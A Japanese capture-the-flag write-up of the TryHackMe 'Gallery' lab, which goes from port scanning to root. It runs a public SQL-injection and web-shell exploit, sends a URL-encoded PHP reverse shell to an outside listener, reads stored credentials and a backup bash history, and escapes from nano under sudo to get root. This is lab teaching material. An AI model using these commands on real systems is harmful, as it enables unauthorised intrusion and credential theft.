# Gallery CTF

https://tryhackme.com/room/gallery666

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.57.92
root@ip-10-10-222-110:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-14 06:00 GMT
Nmap scan report for 10.10.57.92
Host is up (0.00023s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 02:11:FA:E2:97:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.67 seconds
root@ip-10-10-222-110:~# sudo nmap -sV -p80,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-14 06:00 GMT
Nmap scan report for 10.10.57.92
Host is up (0.00012s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:11:FA:E2:97:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.78 seconds
```

80 ポートは Apache のインストールページ  
8080 ポートは「Simple Image Gallery System」のログインページ（http://10.10.57.92/gallery/login.php　に転送されている）

### gobuster

```shell
root@ip-10-10-222-110:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.57.92
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/gallery              (Status: 301) [Size: 312] [--> http://10.10.57.92/gallery/]
/server-status        (Status: 403) [Size: 276]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

### Simple Image Gallery

脆弱性検索

```shell
$ searchsploit Simple Image Gallery
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Joomla Plugin Simple Image Gallery Extended (SIGE) 3.5.3 - Multiple Vulnerabiliti | php/webapps/49064.txt
Joomla! Component Kubik-Rubik Simple Image Gallery Extended (SIGE) 3.2.3 - Cross- | php/webapps/44104.txt
Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)          | php/webapps/50214.py
Simple Image Gallery System 1.0 - 'id' SQL Injection                              | php/webapps/50198.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

エクスプロイト。  
内容を見ると、ユーザー名に'1'='1'#を指定するタイプの初歩的な脆弱性だった。

```shell
$ python ./50214.py
TARGET = http://10.10.57.92/gallery
Login Bypass
shell name TagozpyohmrjbjcrdnbLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.57.92/gallery/uploads/1741932720_TagozpyohmrjbjcrdnbLetta.php?cmd=whoami
```

Web シェルのアップロード成功。

リバースシェル

```shell
php -r '$sock=fsockopen("10.2.22.182",6688);exec("sh <&3 >&3 2>&3");'
```

URL エンコードして送信する

```shell
$ curl http://10.10.57.92/gallery/uploads/1741932720_TagozpyohmrjbjcrdnbLetta.php?cmd=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%32%2e%32%32%2e%31%38%32%22%2c%36%36%38%38%29%3b%65%78%65%63%28%22%73%68%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
```

シェル取得成功

```shell
─$ nc -nlvp 6688
listening on [any] 6688 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.57.92] 36226
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

安定化（ここが中途半端だったため、後で苦労した）

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

```shell
www-data@gallery:/var/www/html/gallery/uploads$ ls -al /home
ls -al /home
total 16
drwxr-xr-x  4 root root 4096 May 20  2021 .
drwxr-xr-x 23 root root 4096 Feb 12  2022 ..
drwxr-xr-x  6 mike mike 4096 Aug 25  2021 mike
drwx------  4 root root 4096 May 20  2021 ubuntu
www-data@gallery:/var/www/html/gallery/uploads$ ls -al /home/mike
ls -al /home/mike
total 44
drwxr-xr-x 6 mike mike 4096 Aug 25  2021 .
drwxr-xr-x 4 root root 4096 May 20  2021 ..
-rw------- 1 mike mike  135 May 24  2021 .bash_history
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
drwx------ 3 mike mike 4096 May 20  2021 .gnupg
drwxrwxr-x 3 mike mike 4096 Aug 25  2021 .local
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
drwx------ 2 mike mike 4096 May 24  2021 documents
drwx------ 2 mike mike 4096 May 24  2021 images
-rwx------ 1 mike mike   32 May 14  2021 user.txt
```

mike に昇格する必要がある。

## admin パスワードのハッシュ

昇格の前に、質問に答えるために admin パスワードのハッシュが必要。

```shell
?>www-data@gallery:/var/www/html/gallery$ cat initialize.php
cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
```

DB 接続

```shell
www-data@gallery:/var/www/html/gallery$ mysql -u gallery_user -p
mysql -u gallery_user -p
Enter password: passw0rd321

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 123
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use gallery_db;
use gallery_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]>
```

user テーブル表示

```shell
MariaDB [gallery_db]> show tables;
show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)

MariaDB [gallery_db]> select * from users;
select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | <ひみつ> | uploads/1741932720_TagozpyohmrjbjcrdnbLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2025-03-14 06:12:58 |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)
```

admin ユーザーのパスワードハッシュゲット。

## 権限昇格１

SUID

```shell
www-data@gallery:/var/www/html/gallery$ find / -perm -u=s -type f -ls 2>/dev/null
lind / -perm -u=s -type f -ls 2>/dev/null
   262946     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
   269190     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount
   270281     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount
   262895     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   264760     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2022 /bin/su
   263802    148 -rwsr-xr-x   1 root     root       149080 Jan 19  2021 /usr/bin/sudo
   269243     60 -rwsr-xr-x   1 root     root        59640 Jan 25  2022 /usr/bin/passwd
   269233     44 -rwsr-xr-x   1 root     root        44528 Jan 25  2022 /usr/bin/chsh
   264767     40 -rwsr-xr-x   1 root     root        40344 Jan 25  2022 /usr/bin/newgrp
   264545     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   264764     76 -rwsr-xr-x   1 root     root        76496 Jan 25  2022 /usr/bin/chfn
   264111     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
   269242     76 -rwsr-xr-x   1 root     root        75824 Jan 25  2022 /usr/bin/gpasswd
   271314    428 -rwsr-xr-x   1 root     root       436552 Aug 11  2021 /usr/lib/openssh/ssh-keysign
   264730     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   266779     16 -rwsr-xr-x   1 root     root          14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   264737     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
```

オーナーファイル

```shell
www-data@gallery:/var/www/html/gallery$ find / -user mike -type f 2>/dev/null
find / -user mike -type f 2>/dev/null
/home/mike/user.txt
/home/mike/.bashrc
/home/mike/.bash_history
/home/mike/.bash_logout
/home/mike/.profile
```

もしかしたら、さっきのパスワードハッシュが mike のパスワードと同じ可能性があるので調べる。

/classes/Login.php

```php
$qry = $this->conn->query("SELECT * from users where username = '$username' and password = md5('$password') ");
```

MD5 ハッシュなのは間違いない。  
rockyou.txt でも 10-million-password-list-top-1000000.txt でもヒットしなかった。

DB の接続パスワードで試したが失敗。

linpeas.sh を実行。

```shell
╔══════════╣ Backup folders
drwx------ 2 root root 4096 May 20  2021 /etc/lvm/backup
drwxr-xr-x 3 root root 4096 Mar 14 06:48 /var/backups
total 732
-rw-r--r-- 1 root root    51200 Mar 14 06:25 alternatives.tar.0
-rw-r--r-- 1 root root    34388 Mar 14 06:00 apt.extended_states.0
-rw-r--r-- 1 root root     3773 Feb 12  2022 apt.extended_states.1.gz
-rw-r--r-- 1 root root     3748 Aug 25  2021 apt.extended_states.2.gz
-rw-r--r-- 1 root root     3516 May 21  2021 apt.extended_states.3.gz
-rw-r--r-- 1 root root     3575 May 20  2021 apt.extended_states.4.gz
-rw-r--r-- 1 root root      437 May 20  2021 dpkg.diversions.0
-rw-r--r-- 1 root root      332 Aug 25  2021 dpkg.statoverride.0
-rw-r--r-- 1 root root   612396 Mar 14 06:00 dpkg.status.0
-rw------- 1 root root      761 Aug 25  2021 group.bak
-rw------- 1 root shadow    633 Aug 25  2021 gshadow.bak
drwxr-xr-x 5 root root     4096 May 24  2021 mike_home_backup
-rw------- 1 root root     1670 Aug 25  2021 passwd.bak
-rw------- 1 root shadow   1179 Aug 25  2021 shadow.bak
```

/var/backups/mike_home_backup が興味深い。

```shell
www-data@gallery:/var/backups/mike_home_backup$ find .
find .
.
./.bashrc
./.bash_history
./.gnupg
./.gnupg/private-keys-v1.d
./.bash_logout
./images
./images/23-04.jpg
./images/my-cat.jpg
./images/26-04.jpg
./documents
./documents/accounts.txt
./.profile

www-data@gallery:/var/backups/mike_home_backup$ cat ./documents/accounts.txt
cat ./documents/accounts.txt
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```

```shell
www-data@gallery:/var/backups/mike_home_backup$ su mike
su mike
Password: darkhacker123

su: Authentication failure
www-data@gallery:/var/backups/mike_home_backup$ su mike
su mike
Password: mycat666

su: Authentication failure
www-data@gallery:/var/backups/mike_home_backup$ su mike
su mike
Password: 123456789pass

su: Authentication failure
```

全滅・・・

```shell
./images/23-04.jpg
./images/my-cat.jpg
./images/26-04.jpg
```

binwalk と stegseek を試したが、何も出なかった。

.bash_history がバックアップされていることに気付いた。

```shell
www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history
cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -l（ひみつ）
clear
sudo -l
exit
```

```shell
www-data@gallery:/var/backups/mike_home_backup$ su mike
su mike
Password: （ひみつ）

mike@gallery:/var/backups/mike_home_backup$
```

昇格成功。

```shell
mike@gallery:~$ cat user.txt
cat user.txt
THM{a....................}
```

ユーザーフラグゲット

## 権限昇格２

```shell
mike@gallery:~$ sudo -l
sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

root で /opt/rootkit.sh を実行できる。

```shell
mike@gallery:~$ ls -al /opt/rootkit.sh
ls -al /opt/rootkit.sh
-rw-r--r-- 1 root root 364 May 20  2021 /opt/rootkit.sh

mike@gallery:~$ cat /opt/rootkit.sh
cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

read と入力すれば、nano が起動する。

```shell
mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read
read
```

nano エディターで

```shell
^R^X
を押した後、
reset; sh 1>&0 2>&0
```

とすれば良いはずだが、最初は nano の表示が正常ではなく、うまくいかなかった。

結局、シェルの安定化を下記まで実行したら表示できた。ギリギリ表示できたという感じ。

```shell
# python が無くても、python3 でいける場合もある
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg
#（終了後）エコー無効にして入力非表示になっているので
reset
```

```shell
# ls /root
report.txt  root.txt
# cat /root/^H.tx^H^H
cat: '/root/'$'\b''.tx'$'\b\b': No such file or directory
# cat /root/root.txt
THM{b.....................}
```

## 振り返り

- シェルの安定化が中途半端だったのが原因で、最後の nano の部分で相当苦労した。
- ターミナルサイズまで設定することで nano が正常に表示されるようになったので、今後はリバースシェルを取った時点で実行するようにしたい。

```shell
stty rows 54
stty cols 235
```

- バックアップディレクトリはなかなか気付かなかった。ファイルの中身を Grep するだけでなく、ファイル名やディレクトリ名も検索対象にするべきかもしれない。
- 今回の場合、検索ワードは password ではなく sudo が有効だった。
